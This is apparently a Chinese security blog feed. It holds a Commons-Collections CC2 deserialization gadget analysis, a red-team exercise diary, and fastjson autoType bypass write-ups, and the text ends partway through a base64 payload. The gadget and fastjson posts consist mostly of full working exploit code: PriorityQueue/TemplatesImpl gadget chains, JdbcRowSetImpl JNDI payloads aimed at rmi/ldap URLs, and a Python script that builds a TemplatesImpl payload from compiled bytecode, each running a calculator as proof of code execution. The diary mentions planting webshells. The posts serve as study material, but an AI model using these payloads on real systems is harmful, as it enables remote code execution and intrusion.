person.addMethod(CtNewMethod.getter(&quot;getName&quot;,name));        person.addMethod(CtNewMethod.setter(&quot;setName&quot;,name));        //创建无参构造        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, person);        constructor.setBody(&quot;&#123;name = \&quot;xiaotan\&quot;;&#125;&quot;);        person.addConstructor(constructor);        //创建有参构造        constructor = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;,person);        constructor.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);//$0 = this, $1$2$3····代表方法参数        person.addConstructor(constructor);        CtMethod printName = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, person);        printName.setModifiers(Modifier.PUBLIC);        printName.setBody(&quot;System.out.println(name);&quot;);        person.addMethod(printName);        //person.writeFile(&quot;./Person&quot;);        Object obj = person.toClass().newInstance();        Method setName = obj.getClass().getMethod(&quot;setName&quot;, String.class);        setName.invoke(obj,&quot;pyshare&quot;);        Method method = obj.getClass().getMethod(&quot;printName&quot;);        method.invoke(obj);    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp2yb5rm2ij312c08e752.jpg" alt=""></p><p>这里在无参构造的时候新加了一段代码，否则会报错。</p><h3 id="通过-class文件调用"><a href="#通过-class文件调用" class="headerlink" title="通过.class文件调用"></a>通过.class文件调用</h3><pre><code class="java">ClassPool pool = ClassPool.getDefault();// 设置类路径pool.appendClassPath(&quot;/Users/xiaotan/Public/javacode/cc4/src/test/java&quot;);CtClass ctClass = pool.get(&quot;Person&quot;);Object person = ctClass.toClass().newInstance();//  ...... 下面和通过反射的方式一样去使用</code></pre><h3 id="通过接口调用"><a href="#通过接口调用" class="headerlink" title="通过接口调用"></a>通过接口调用</h3><pre><code class="java">public interface PersonI &#123;    void setName(String name);    String getName();    void printName();&#125;</code></pre><pre><code class="java">ClassPool pool = ClassPool.getDefault();pool.appendClassPath(&quot;/Users/xiaotan/Public/javacode/cc4/src/test/java&quot;);// 获取接口CtClass codeClassI = pool.get(&quot;PersonI&quot;);CtClass ctClass = pool.get(&quot;Person&quot;);ctClass.setInterfaces(new CtClass[]&#123;codeClassI&#125;);PersonI person = (PersonI)ctClass.toClass().newInstance();System.out.println(person.getName());person.setName(&quot;xiao&quot;);person.printName();</code></pre><p>我们可以发现其实第一种和第二种方法最终都是通过反射的方法执行的。</p><p>同理我们可以构造代码进行命令执行<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp36stes0lj31i80u07sg.jpg" alt=""><br>如上是通过加载字节码的方式调用的，当然也可以通过反射的方式调用，因为我们将代码以及加载进入了static中，因此我们主要将类实例化我们就可以进行命令执行。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp36ye630lj31g60qsh84.jpg" alt=""></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在ysoserial的cc2中使用了javassist和Templateslmpl（在后面的我会给出利用链，我们会发现其实利用链原理和fastjson1.2.24中相同）。但是直接看ysoserial的利用链很难理解，我们先沿用cc1的利用链，来进行命令执行，来更好的理解cc2的利用链。</p><h3 id="简易版Poc1"><a href="#简易版Poc1" class="headerlink" title="简易版Poc1"></a>简易版Poc1</h3><pre><code class="java">public class Poc1 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open -a Calculator&quot;&#125;)&#125;);        TransformingComparator comparator = new TransformingComparator(chain);        PriorityQueue queue = new PriorityQueue(1);        queue.add(1);        queue.add(2);        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        field.setAccessible(true);        field.set(queue,comparator);        try &#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));            inputStream.readObject();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp44ce41rij31fl0u0kf8.jpg" alt=""></p><p>我们先来看一下Poc1的利用链：</p><pre><code>ObjectInputStream.readObject()    PriorityQueue.readObject()    PriorityQueue.heapify()        PriorityQueue.siftDown()            PriorityQueue.siftDownUsingComparator()                TransformingComparator.compare()                    InvokerTransformer.transform()                        Method.invoke()            ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()</code></pre><p>我们debug进行跟入：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp476tumvcj31y80u01kx.jpg" alt=""><br>具体的利用链这里就不过多分析了，主要讲讲利用链的主要思路。</p><h4 id="为什么要在queue中加入两个值？"><a href="#为什么要在queue中加入两个值？" class="headerlink" title="为什么要在queue中加入两个值？"></a>为什么要在queue中加入两个值？</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp47inzzt2j30pc07iju3.jpg" alt=""><br>和cc1相同的是，cc2也是通过触发transform来进行命令执行的。而在cc2中是通过触发TransormingComparator的compare来触发的。我们先去看看this.transformer是否可控。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp47olmzomj31eq05m75a.jpg" alt=""><br>很幸运在TransormingComparator的有参构造中，可以直接操控decorated，和transormer</p><p>我们可以看见上面的POC1中又个很奇怪的地方:queue.add(1),queue.add(2)。为什么要这样写呢？因为中PriorityQueue.heapify()中会判断queue的size是否大于1，如果不是的话不会触发siftDown。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp47vlrttvj30uy06y76e.jpg" alt=""></p><h4 id="为什么用的是collections4-0？"><a href="#为什么用的是collections4-0？" class="headerlink" title="为什么用的是collections4.0？"></a>为什么用的是collections4.0？</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp48d1ewtgj31e20g0wn2.jpg" alt=""></p><p>因为在CC4.0中TransformingComparator继承了Serializable，而CC3.1没有。</p><h3 id="Poc2"><a href="#Poc2" class="headerlink" title="Poc2"></a>Poc2</h3><p>现在我们来看看yos中利用到javassist和Templateslmpl的利用链</p><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>这里是Templateslmpl加载字节码的利用链：</p><pre><code>TemplatesImpl.getOutputProperties()  TemplatesImpl.newTransformer()    TemplatesImpl.getTransletInstance()        TemplatesImpl.defineTransletClasses()            TransletClassLoader.defineClass()</code></pre><p>在Poc2中我们设置了几个值，这是因为在TemplatesImpl会对_name和_class判断，那_bytecodes又是如何触发的呢？我们跟入defineTransletClasses中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k1g6u0jj30zy0syjw4.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4jh66xsaj30ro0cognf.jpg" alt=""></p><p>这里会判断_name是否为null，_class是否为null。我们再回过头看看在TemplatesImpl中还有一个地方，为什么要将字节码classBytes设置成byte[][]的类型？</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k2df9sij30zc08kjtg.jpg" alt=""><br>这是因为在TemplatesImpl中，_bytecodes是byte[][]类型的，所以需要进行转换。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k50qfggj30yc05qgmb.jpg" alt=""></p><p>还有最后一点这里会判断字节码的父类是不是AbstractTranslet.class。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4kjybmb7j30xi0g0ac3.jpg" alt=""></p><h4 id="为什么要设置size为2"><a href="#为什么要设置size为2" class="headerlink" title="为什么要设置size为2"></a>为什么要设置size为2</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4kracjexj30vk06odgi.jpg" alt=""><br>这里如果不设置，则无法进入siftDown。</p><h3 id="为什么要用反射修改size"><a href="#为什么要用反射修改size" class="headerlink" title="为什么要用反射修改size"></a>为什么要用反射修改size</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4liashr0j31fo08idh8.jpg" alt=""></p><p>我们在Poc1中是直接利用add的方法修改size但是这里我也试了一下，是无法触发的，因为如果使用add会将TemplatesImpl覆盖掉，所以需要利用反射。而为什么需要修改size上面也已经说过了，如果size不大于1是无法触发siftDown的。<br>下面是Poc2完整的代码</p><pre><code class="java">import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class Poc2 &#123;    public static void main(String[] args) throws Exception &#123;        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;)                .getDeclaredConstructor(String.class);        constructor.setAccessible(true);        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;evil&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        TransformingComparator comparator = new TransformingComparator(transformer);        PriorityQueue queue = new PriorityQueue(1);        Object[] queue_array = new Object[]&#123;templates,1&#125;;        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);        queue_field.setAccessible(true);        queue_field.set(queue,queue_array);        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(queue,2);//        queue.add(1);//        queue.add(2);        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,comparator);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    &#125;    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;        Field field = null;        try &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        &#125;        catch (NoSuchFieldException ex) &#123;            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        return field;    &#125;&#125;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上面是我对CC2的分析，分析的不是很仔细，只对一些关键点进行了分析，因为我觉得如果跟着利用链一步步分析有点像流水账，不如写下一些关键点，多留出思考的空间。下面想学习一下内网，可是也想学代码审计，呜呜，心还是静不下来，要努力把心静下来，好好专研技术。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>HW总结</title>
    <link href="http://yoursite.com/2021/03/26/HW%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2021/03/26/HW%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-26T06:21:01.000Z</published>
    <updated>2021-07-29T08:37:03.993Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HW总结"><a href="#HW总结" class="headerlink" title="HW总结"></a>HW总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经两个星期没有发文章了，因为前个星期在HW，身为一个大二的在校生，当要去HW当红队的时候，心里还是蛮紧张的。在那里包吃包住，而且酒店也挺好的，蛮开心的。从中也学到了很多，不过HW还是蛮累的，结束的那天十点就睡着啦，结果回来又有通知要打HW，此时我的心里是裂开的，又要醉生梦死了QAQ。</p><h2 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h2><h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3><p>第一天主要是在信息搜集，打点。运气蛮好的，在对某个网站进行C段扫描，和端口扫描的时候，发现了一个薄弱点。这里就不得不吐槽一下，服务器是真的垃圾呀，在当天晚上直接崩了，我都啥都没干就下了个数据库备份文件。当场脑溢血，没办法，当时只能想着第二天再想想办法，看看管理员会不会重启一下服务器。</p><h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><p>因为第一天晚上好不容易找到的服务器崩了，本来好不容易找到了mysql数据库的root权限账号密码，而且机缘巧合的该网站存在phpMyAdmin，结果网站炸了。第二天一大早起来，去看了看结果也还是依旧无法打开。哎，还能怎么办呢，只能重新再找一下看看有没有别的地方可以，结果找了一天无果。只有一些不痛不痒的小洞，还好，网站管理员在下午的时候，把网站又打开了，果断的利用phpMyAdmin写了一个webshell进去，结果可能被管理员发现了，好家伙，直接把网站给我关了，当场我就裂开了。</p><h3 id="第三天-amp-第四天"><a href="#第三天-amp-第四天" class="headerlink" title="第三天 &amp; 第四天"></a>第三天 &amp; 第四天</h3><p>运气好我又找到了一个点，并且种了一个内存马进去，可是虽然是root权限，可是我不能执行所有交互式的命令，反弹shell也弹不出，webshell写进去可是无法访问，哎终究是太菜了，哭泣。只能苦逼的找一找内网有啥利用点，因为内网不是很熟悉，在最后两天被别的队吊打了，因为队员都不太懂这些，基本上一个人在奋斗，QAQ好想被大佬带飞。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>正式学安全一年了，我咋还是这么菜。不知道下辈子能不能达到大佬们的一半水平QAQ。这次hw发现了自己的很多不足，在开发和内网的知识还有很多欠缺，还要更加努力的学习呀。今天更朱爷请教了一下审计的学习，很感谢大佬的指点，这段时间跟着木爷一起学习感觉很充实，希望以后还能继续努力。</p>]]></content>
    
    <summary type="html">
    
      闲谈
    
    </summary>
    
    
      <category term="闲谈" scheme="http://yoursite.com/categories/%E9%97%B2%E8%B0%88/"/>
    
    
      <category term="闲谈" scheme="http://yoursite.com/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>再探fastjson</title>
    <link href="http://yoursite.com/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/"/>
    <id>http://yoursite.com/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/</id>
    <published>2021-03-11T12:12:01.000Z</published>
    <updated>2021-07-29T08:34:03.858Z</updated>
    
    <content type="html"><![CDATA[<h1 id="再探fastjson"><a href="#再探fastjson" class="headerlink" title="再探fastjson"></a>再探fastjson</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>java 8u112</li><li>IDEA2020.3</li><li>fastjson<h2 id="fastjson-1-2-25-1-4-41"><a href="#fastjson-1-2-25-1-4-41" class="headerlink" title="fastjson 1.2.25-1.4.41"></a>fastjson 1.2.25-1.4.41</h2></li></ul><pre><code class="java">import com.alibaba.fastjson.JSON;public class Main &#123;    public static void main(String[] args) &#123;        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;        JSON.parse(PoC);    &#125;&#125;</code></pre><p>我们按照1.2.24的POC试试看。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwcdl67lj30vt06u75s.jpg" alt=""><br>很显然失败了，并且返回了一个错误：autoType is not support。在Fastjson1.2.25中使用了checkAutoType来修复1.2.22-1.2.24中的漏洞，其中有个autoTypeSupport默认为False。那chekAutoType究竟做了什么呢？我们还是利用现在的POC进行Debug观察一下。</p><p>按照执行链我们可以很容易的就找到checkAutotype这个函数。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwfvg4wuj30pu03sq3m.jpg" alt="">它传入了ref和null这两个参数。其中的ref就是我们传入的@type的值：com.sun.rowset.JdbcRowSetImpl，这里我们跟入。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwj5il41j30wi0cldhx.jpg" alt=""><br>如上图所示，先通过对typeName的替换得到className，随后判断autoTypeSupport和expectClass这里的expectClass就是在checkAutoType传入的null值，这里的判断不成立向下执行。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwynzr97j30mj037mxe.jpg" alt=""><br>随后对clazz进行了两次寻找，但是最后都返回为null，我们这里重点关注一下getClassFromMapping这个函数，我们先看一下下一段函数。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofx155zuxj312d0gdjtn.jpg" alt=""><br>下面先对clazz进行判断，加入clazz不为null，遍可以绕过黑名单检查，也可以不坚持autoTypeSupport。回归正题，我们继续往下跟，这里会进入else的执行语句，进入后会判断autoTyperSupport是否为flase，这里判断成功进入后会先匹配是否在黑名单中，如果存在就抛出异常，如果不存在继续匹配白名单。</p><p>我们对两个对class读取对函数，进行观察发现在Typeutils这个函数里面有个很奇怪的函数，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog2ti1mauj30ng0fqtau.jpg" alt=""><br>typeutils.loadClass这个函数中会去匹配class是否以[L或者L开头，；结尾，并且将它们去掉。这个函数很奇怪，这是因为：<br>JNI字段描述符的存在，其中的’[‘用以表示数组的层数，而第二个字符则表示数组的类型，例如：</p><ul><li>double[][]对应的类对象为”[[D”。</li><li>int[]对应的类对象为“[i”.</li><li>com.sun.rowset.JdbcRowSetImpl[]对应的类对象名为“[Lcom.sun.rowset.JdbcRowSetImpl;”</li></ul><p>L；其中的表示该对象所属的类。称为类对象描述符。</p><p>但是我们通过阅读整段的checkAutotype代码：</p><pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;        if (typeName == null) &#123;            return null;        &#125; else &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            if (this.autoTypeSupport || expectClass != null) &#123;                int i;                String deny;                for(i = 0; i &lt; this.acceptList.length; ++i) &#123;                    deny = this.acceptList[i];                    if (className.startsWith(deny)) &#123;                        return TypeUtils.loadClass(typeName, this.defaultClassLoader);                    &#125;                &#125;                for(i = 0; i &lt; this.denyList.length; ++i) &#123;                    deny = this.denyList[i];                    if (className.startsWith(deny)) &#123;                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);                    &#125;                &#125;            &#125;            Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);            if (clazz == null) &#123;                clazz = this.deserializers.findClass(typeName);            &#125;            if (clazz != null) &#123;                if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                &#125; else &#123;                    return clazz;                &#125;            &#125; else &#123;                if (!this.autoTypeSupport) &#123;                    String accept;                    int i;                    for(i = 0; i &lt; this.denyList.length; ++i) &#123;                        accept = this.denyList[i];                        if (className.startsWith(accept)) &#123;                            throw new JSONException(&quot;autoType is not support. &quot; + typeName);                        &#125;                    &#125;                    for(i = 0; i &lt; this.acceptList.length; ++i) &#123;                        accept = this.acceptList[i];                        if (className.startsWith(accept)) &#123;                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);                            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;                                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                            &#125;                            return clazz;                        &#125;                    &#125;                &#125;                if (this.autoTypeSupport || expectClass != null) &#123;                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);                &#125;                if (clazz != null) &#123;                    if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);                    &#125;                    if (expectClass != null) &#123;                        if (expectClass.isAssignableFrom(clazz)) &#123;                            return clazz;                        &#125;                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                    &#125;                &#125;                if (!this.autoTypeSupport) &#123;                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125; else &#123;                    return clazz;                &#125;            &#125;        &#125;    &#125;</code></pre><p>我们可以发现只有当AutoType为true是才可以触发loadclass，或者和需要中map中读取到class才能触发。<br>我们先看AutoType为true的情况：</p><pre><code class="java">public class Main &#123;    public static void main(String[] args) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;        JSON.parse(PoC);    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog4xbu0hgj314p02waad.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog4y89ofvj313u0miwir.jpg" alt=""><br>可以看见上面成功的触发了。<br>但是如果为fasle时又该如何触发呢？<br>这里偷了别人的POC：</p><pre><code class="java">&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测</p><p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用<br>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用.</p><h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson 1.2.42"></a>fastjson 1.2.42</h2><p>POC多加一个L和；。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog6x64luhj315i050mxm.jpg" alt=""></p><p>这是因为这checkAytoType中多了一次对classname的提取<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog705m1xxj312906dwfn.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog71894vsj30ay048mx4.jpg" alt=""></p><p>所以多添加一组进行绕过。</p><p>这里有一篇对<a href="https://xz.aliyun.com/t/8140">checkAutoType安全机制分析详细的文章</a><br>1.4.3的漏洞也很简单。就不过多分析了。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>fastjson 1.22-1.24 Templateslmpl漏洞复现与分析</title>
    <link href="http://yoursite.com/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-08T13:12:01.000Z</published>
    <updated>2021-07-29T05:50:47.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson-1-22-1-24-Templateslmpl漏洞复习与分析"><a href="#fastjson-1-22-1-24-Templateslmpl漏洞复习与分析" class="headerlink" title="fastjson 1.22-1.24 Templateslmpl漏洞复习与分析"></a>fastjson 1.22-1.24 Templateslmpl漏洞复习与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天复现了一下jdbcRowsetlmpl,天来分析一下Templatelmpl。个人觉得Templatelmpl链比jdbcRowsetlmpl的要简单一些。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class TEMPOC extends AbstractTranslet &#123;    public TEMPOC() throws IOException &#123;        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;    &#125;    @Override    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;    &#125;    public static void main(String[] args) throws Exception &#123;        TEMPOC t = new TEMPOC();    &#125;&#125;</code></pre><p>将这个编译成class文件，再利用python脚步读取class文件进行base64加密。</p><pre><code class="python">import base64fin = open(r&quot;TEMPOC.class&quot;,&quot;rb&quot;)byte = fin.read()fout = base64.b64encode(byte).decode(&quot;utf-8&quot;)poc = &#39;&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;%s&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123;&#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;&#39;% foutprint poc</code></pre><pre><code class="java">import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;public class POC &#123;    public static void main(String[] args) &#123;        String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEAFFRlbXBsYXRlc0ltcGwvVEVNUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAA0ABAAOA